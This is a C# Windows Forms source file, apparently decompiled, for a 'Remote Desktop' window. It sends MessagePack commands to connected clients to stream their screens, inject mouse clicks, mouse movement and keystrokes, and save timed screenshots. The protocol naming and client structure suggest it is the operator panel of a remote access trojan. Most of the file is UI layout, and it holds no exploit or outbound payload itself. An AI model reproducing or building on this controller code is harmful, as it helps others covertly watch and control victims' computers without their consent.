using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Server.Connection;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;

namespace Server.Forms;

public class FormRemoteDesktop : XtraForm
{
	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

	public Size rdSize;

	private bool isMouse;

	private bool isKeyboard;

	public object syncPicbox = new object();

	private readonly List<Keys> _keysPressed;

	private IContainer components;

	public PictureBox pictureBox1;

	public System.Windows.Forms.Timer timer1;

	private Label label1;

	private Label label2;

	private System.Windows.Forms.Timer timerSave;

	public Label labelWait;

	private Label label6;

	private Label label5;

	private Label label4;

	private SimpleButton btnSave;

	private SimpleButton btnMouse;

	private SimpleButton btnKeyboard;

	public SpinEdit numericUpDown1;

	public SpinEdit numericUpDown2;

	private PanelControl panelControl1;

	private PanelControl panelControl2;

	private SimpleButton button1;

	private XtraTabControl xtraTabControl2;

	private XtraTabPage xtraTabPage2;

	public FormMain F { get; set; }

	internal Clients ParentClient { get; set; }

	internal Clients Client { get; set; }

	public string FullPath { get; set; }

	public Image GetImage { get; set; }

	public FormRemoteDesktop()
	{
		_keysPressed = new List<Keys>();
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void FormRemoteDesktop_Load(object sender, EventArgs e)
	{
		try
		{
			button1.Tag = "stop";
		}
		catch
		{
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (button1.Tag == "play")
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
			msgPack.ForcePathObject("Option").AsString = "capture";
			msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
			msgPack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
			decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			numericUpDown1.Enabled = false;
			numericUpDown2.Enabled = false;
			btnSave.Enabled = true;
			btnMouse.Enabled = true;
			button1.Tag = "stop";
		}
		else
		{
			button1.Tag = "play";
			try
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack2.ForcePathObject("Option").AsString = "stop";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
			}
			catch
			{
			}
			numericUpDown1.Enabled = true;
			numericUpDown2.Enabled = true;
			btnSave.Enabled = false;
			btnMouse.Enabled = false;
		}
	}

	private void BtnSave_Click(object sender, EventArgs e)
	{
		if (button1.Tag != "stop")
		{
			return;
		}
		if (timerSave.Enabled)
		{
			timerSave.Stop();
			return;
		}
		timerSave.Start();
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			Process.Start(FullPath);
		}
		catch
		{
		}
	}

	private void TimerSave_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			Encoder quality = Encoder.Quality;
			EncoderParameters encoderParameters = new EncoderParameters(1);
			EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
			encoderParameters.Param[0] = encoderParameter;
			ImageCodecInfo encoder = GetEncoder(ImageFormat.Jpeg);
			pictureBox1.Image.Save(FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
			encoderParameters?.Dispose();
			encoderParameter?.Dispose();
		}
		catch
		{
		}
	}

	private ImageCodecInfo GetEncoder(ImageFormat format)
	{
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
		{
			if (imageCodecInfo.FormatID == format.Guid)
			{
				return imageCodecInfo;
			}
		}
		return null;
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
			{
				Point point = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
				int num = 0;
				if (e.Button == MouseButtons.Left)
				{
					num = 2;
				}
				if (e.Button == MouseButtons.Right)
				{
					num = 8;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "mouseClick";
				msgPack.ForcePathObject("X").AsInteger = point.X;
				msgPack.ForcePathObject("Y").AsInteger = point.Y;
				msgPack.ForcePathObject("Button").AsInteger = num;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		try
		{
			if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
			{
				Point point = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
				int num = 0;
				if (e.Button == MouseButtons.Left)
				{
					num = 4;
				}
				if (e.Button == MouseButtons.Right)
				{
					num = 16;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "mouseClick";
				msgPack.ForcePathObject("X").AsInteger = point.X;
				msgPack.ForcePathObject("Y").AsInteger = point.Y;
				msgPack.ForcePathObject("Button").AsInteger = num;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		try
		{
			if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
			{
				Point point = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "mouseMove";
				msgPack.ForcePathObject("X").AsInteger = point.X;
				msgPack.ForcePathObject("Y").AsInteger = point.Y;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		if (isMouse)
		{
			isMouse = false;
		}
		else
		{
			isMouse = true;
		}
		pictureBox1.Focus();
	}

	private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			GetImage?.Dispose();
			ThreadPool.QueueUserWorkItem(delegate
			{
				Client?.Disconnected();
			});
		}
		catch
		{
		}
	}

	private void btnKeyboard_Click(object sender, EventArgs e)
	{
		if (isKeyboard)
		{
			isKeyboard = false;
		}
		else
		{
			isKeyboard = true;
		}
		pictureBox1.Focus();
	}

	private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
	{
		if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			if (!_keysPressed.Contains(e.KeyCode))
			{
				_keysPressed.Add(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(bVal: true);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
	}

	private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
	{
		if (button1.Tag == "stop" && pictureBox1.Image != null && base.ContainsFocus && isKeyboard)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			_keysPressed.Remove(e.KeyCode);
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
			msgPack.ForcePathObject("Option").AsString = "keyboardClick";
			msgPack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
			msgPack.ForcePathObject("keyIsDown").SetAsBoolean(bVal: false);
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private bool IsLockKey(Keys key)
	{
		if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
		{
			return (key & Keys.Scroll) == Keys.Scroll;
		}
		return true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormRemoteDesktop));
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.numericUpDown2 = new DevExpress.XtraEditors.SpinEdit();
		this.btnKeyboard = new DevExpress.XtraEditors.SimpleButton();
		this.numericUpDown1 = new DevExpress.XtraEditors.SpinEdit();
		this.label6 = new System.Windows.Forms.Label();
		this.btnMouse = new DevExpress.XtraEditors.SimpleButton();
		this.label5 = new System.Windows.Forms.Label();
		this.btnSave = new DevExpress.XtraEditors.SimpleButton();
		this.label4 = new System.Windows.Forms.Label();
		this.label2 = new System.Windows.Forms.Label();
		this.label1 = new System.Windows.Forms.Label();
		this.timerSave = new System.Windows.Forms.Timer(this.components);
		this.labelWait = new System.Windows.Forms.Label();
		this.panelControl1 = new DevExpress.XtraEditors.PanelControl();
		this.panelControl2 = new DevExpress.XtraEditors.PanelControl();
		this.button1 = new DevExpress.XtraEditors.SimpleButton();
		this.xtraTabControl2 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage2 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).BeginInit();
		this.panelControl1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl2).BeginInit();
		this.panelControl2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).BeginInit();
		this.xtraTabControl2.SuspendLayout();
		this.xtraTabPage2.SuspendLayout();
		base.SuspendLayout();
		this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.pictureBox1.Location = new System.Drawing.Point(0, 34);
		this.pictureBox1.Margin = new System.Windows.Forms.Padding(2);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(814, 366);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 0;
		this.pictureBox1.TabStop = false;
		this.pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseDown);
		this.pictureBox1.MouseMove += new System.Windows.Forms.MouseEventHandler(pictureBox1_MouseMove);
		this.pictureBox1.MouseUp += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseUp);
		this.timer1.Interval = 2000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.numericUpDown2.EditValue = new decimal(new int[4]);
		this.numericUpDown2.Location = new System.Drawing.Point(389, 3);
		this.numericUpDown2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.numericUpDown2.Name = "numericUpDown2";
		this.numericUpDown2.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.numericUpDown2.Properties.Appearance.Options.UseFont = true;
		this.numericUpDown2.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.numericUpDown2.Size = new System.Drawing.Size(105, 28);
		this.numericUpDown2.TabIndex = 5;
		this.btnKeyboard.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("btnKeyboard.ImageOptions.Image");
		this.btnKeyboard.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnKeyboard.ImageOptions.SvgImageSize = new System.Drawing.Size(24, 24);
		this.btnKeyboard.Location = new System.Drawing.Point(226, 3);
		this.btnKeyboard.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnKeyboard.Name = "btnKeyboard";
		this.btnKeyboard.Size = new System.Drawing.Size(22, 21);
		this.btnKeyboard.TabIndex = 7;
		this.btnKeyboard.Click += new System.EventHandler(btnKeyboard_Click);
		this.numericUpDown1.EditValue = new decimal(new int[4] { 30, 0, 0, 0 });
		this.numericUpDown1.Location = new System.Drawing.Point(189, 3);
		this.numericUpDown1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.numericUpDown1.Name = "numericUpDown1";
		this.numericUpDown1.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.numericUpDown1.Properties.Appearance.Options.UseFont = true;
		this.numericUpDown1.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.numericUpDown1.Size = new System.Drawing.Size(105, 28);
		this.numericUpDown1.TabIndex = 4;
		this.label6.AutoSize = true;
		this.label6.Location = new System.Drawing.Point(169, 8);
		this.label6.Name = "label6";
		this.label6.Size = new System.Drawing.Size(53, 13);
		this.label6.TabIndex = 10;
		this.label6.Text = "Keyboard";
		this.btnMouse.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("btnMouse.ImageOptions.Image");
		this.btnMouse.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnMouse.ImageOptions.SvgImageSize = new System.Drawing.Size(24, 24);
		this.btnMouse.Location = new System.Drawing.Point(132, 3);
		this.btnMouse.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnMouse.Name = "btnMouse";
		this.btnMouse.Size = new System.Drawing.Size(22, 21);
		this.btnMouse.TabIndex = 6;
		this.btnMouse.Click += new System.EventHandler(Button3_Click);
		this.label5.AutoSize = true;
		this.label5.Location = new System.Drawing.Point(88, 6);
		this.label5.Name = "label5";
		this.label5.Size = new System.Drawing.Size(38, 13);
		this.label5.TabIndex = 9;
		this.label5.Text = "Mouse";
		this.btnSave.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("btnSave.ImageOptions.Image");
		this.btnSave.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnSave.ImageOptions.SvgImageSize = new System.Drawing.Size(24, 24);
		this.btnSave.Location = new System.Drawing.Point(52, 3);
		this.btnSave.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnSave.Name = "btnSave";
		this.btnSave.Size = new System.Drawing.Size(22, 21);
		this.btnSave.TabIndex = 5;
		this.btnSave.Click += new System.EventHandler(BtnSave_Click);
		this.label4.AutoSize = true;
		this.label4.Location = new System.Drawing.Point(5, 6);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(46, 13);
		this.label4.TabIndex = 8;
		this.label4.Text = "Capture";
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(341, 10);
		this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(43, 13);
		this.label2.TabIndex = 4;
		this.label2.Text = "Monitor";
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(103, 10);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(83, 13);
		this.label1.TabIndex = 2;
		this.label1.Text = "Quality Desktop";
		this.timerSave.Interval = 1500;
		this.timerSave.Tick += new System.EventHandler(TimerSave_Tick);
		this.labelWait.AutoSize = true;
		this.labelWait.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.labelWait.Location = new System.Drawing.Point(315, 189);
		this.labelWait.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.labelWait.Name = "labelWait";
		this.labelWait.Size = new System.Drawing.Size(105, 20);
		this.labelWait.TabIndex = 3;
		this.labelWait.Text = "Please Wait...";
		this.panelControl1.Controls.Add(this.label4);
		this.panelControl1.Controls.Add(this.btnKeyboard);
		this.panelControl1.Controls.Add(this.btnSave);
		this.panelControl1.Controls.Add(this.label5);
		this.panelControl1.Controls.Add(this.label6);
		this.panelControl1.Controls.Add(this.btnMouse);
		this.panelControl1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panelControl1.Location = new System.Drawing.Point(0, 431);
		this.panelControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panelControl1.Name = "panelControl1";
		this.panelControl1.Size = new System.Drawing.Size(816, 27);
		this.panelControl1.TabIndex = 4;
		this.panelControl2.Controls.Add(this.numericUpDown2);
		this.panelControl2.Controls.Add(this.button1);
		this.panelControl2.Controls.Add(this.numericUpDown1);
		this.panelControl2.Controls.Add(this.label1);
		this.panelControl2.Controls.Add(this.label2);
		this.panelControl2.Dock = System.Windows.Forms.DockStyle.Top;
		this.panelControl2.Location = new System.Drawing.Point(0, 0);
		this.panelControl2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panelControl2.Name = "panelControl2";
		this.panelControl2.Size = new System.Drawing.Size(814, 34);
		this.panelControl2.TabIndex = 5;
		this.button1.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("button1.ImageOptions.Image");
		this.button1.Location = new System.Drawing.Point(4, 5);
		this.button1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(94, 24);
		this.button1.TabIndex = 0;
		this.button1.Text = "Start";
		this.button1.Click += new System.EventHandler(Button1_Click);
		this.xtraTabControl2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl2.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabControl2.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl2.Name = "xtraTabControl2";
		this.xtraTabControl2.SelectedTabPage = this.xtraTabPage2;
		this.xtraTabControl2.Size = new System.Drawing.Size(816, 431);
		this.xtraTabControl2.TabIndex = 11;
		this.xtraTabControl2.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage2 });
		this.xtraTabPage2.Controls.Add(this.labelWait);
		this.xtraTabPage2.Controls.Add(this.pictureBox1);
		this.xtraTabPage2.Controls.Add(this.panelControl2);
		this.xtraTabPage2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage2.Name = "xtraTabPage2";
		this.xtraTabPage2.Size = new System.Drawing.Size(814, 400);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(816, 458);
		base.Controls.Add(this.xtraTabControl2);
		base.Controls.Add(this.panelControl1);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormRemoteDesktop.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormRemoteDesktop.IconOptions.Image");
		base.KeyPreview = true;
		base.Margin = new System.Windows.Forms.Padding(2);
		this.MinimumSize = new System.Drawing.Size(442, 300);
		base.Name = "FormRemoteDesktop";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Remote Desktop";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormRemoteDesktop_FormClosed);
		base.Load += new System.EventHandler(FormRemoteDesktop_Load);
		base.KeyDown += new System.Windows.Forms.KeyEventHandler(FormRemoteDesktop_KeyDown);
		base.KeyUp += new System.Windows.Forms.KeyEventHandler(FormRemoteDesktop_KeyUp);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).EndInit();
		this.panelControl1.ResumeLayout(false);
		this.panelControl1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl2).EndInit();
		this.panelControl2.ResumeLayout(false);
		this.panelControl2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).EndInit();
		this.xtraTabControl2.ResumeLayout(false);
		this.xtraTabPage2.ResumeLayout(false);
		this.xtraTabPage2.PerformLayout();
		base.ResumeLayout(false);
	}
}
